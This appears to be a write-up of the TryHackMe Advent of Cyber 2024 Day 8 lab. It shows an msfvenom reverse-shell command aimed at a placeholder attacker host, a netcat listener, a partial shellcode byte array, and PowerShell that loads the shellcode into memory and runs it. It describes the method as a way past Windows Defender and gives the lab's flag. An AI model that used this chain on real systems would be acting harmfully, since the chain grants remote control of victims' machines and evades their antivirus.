### TryHackMe Advent of Cyber 2024 - Day 8 Writeup: Shellcodes of the World, Unite!
**Objective:**  
In this task, the goal was to gain access to a Windows machine using a reverse shell and retrieve the flag from `C:\Users\glitch\Desktop\flag.txt`.

### Steps and Commands Used:
1. **Generating Shellcode Using msfvenom:** The reverse shell payload was generated using `msfvenom` with the following command:
    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=4444 -f powershell`
    
    Replace `ATTACKBOX_IP` with your machine's IP address. This generates the shellcode in PowerShell format.
    
2. **Listening on Port 4444:** A listener was started on the AttackBox to listen for the incoming reverse shell connection:
    `nc -nvlp 4444`
    
3. **Executing the PowerShell Script on the Victim Machine:** On the victim machine (Windows), a PowerShell script was used to allocate memory and prepare for executing the shellcode. The script utilized Windows API functions such as `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject`.
    
    The code snippets provided by TryHackMe were used to load the necessary functions for allocating memory and creating a thread to execute the shellcode.
    
4. **Adding and Executing the Shellcode in PowerShell:** After adding the appropriate C# code to the PowerShell script, the following byte code (which was output by `msfvenom`) was inserted into the script:
    `[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,...`
    
    Then the following lines of code were executed to load the shellcode into memory and create a new thread to run it:
    `[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")`
    
5. **Receiving the Reverse Shell:** Upon executing the third line of code to create the thread, a reverse shell was initiated, allowing control over the victim's machine.
    
6. **Retrieving the Flag:** After obtaining the reverse shell, the flag could be accessed by typing the following command:
    `type C:\Users\glitch\Desktop\flag.txt`
    
    **Flag:**  
    The flag was retrieved after a minute and was as follows:
    `AOC{GOT_MY_ACCESS_B@CK007}`
    

---

### Conclusion:

This task demonstrated the process of using PowerShell to execute shellcode and bypassing security mechanisms like Windows Defender by using reflective injection techniques. The reverse shell allowed access to the victim machine, where the flag could be obtained.